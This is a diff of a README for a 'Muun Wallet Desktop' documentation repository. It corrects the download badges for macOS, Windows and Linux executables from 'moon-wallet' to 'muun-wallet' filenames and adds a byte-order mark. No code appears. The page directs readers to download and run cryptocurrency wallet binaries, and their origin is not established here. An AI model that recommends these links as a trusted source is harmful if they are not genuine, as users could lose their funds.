@@ -1,8 +1,8 @@
-# Muun Wallet Docs
+﻿# Muun Wallet Docs
 
 Guides, tutorials, and reference articles for [Muun Wallet Desktop](https://github.com/muun-network/muun-wallet) — the self-custodial Bitcoin and Lightning wallet for macOS, Windows, and Linux.
 
-[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) [![Release v0.5.1](https://img.shields.io/badge/release-v0.5.1-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip) [![Release v0.5.1](https://img.shields.io/badge/release-v0.5.1-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)
 
 Website: [muun-wallet.com](https://muun-wallet.com/)
 
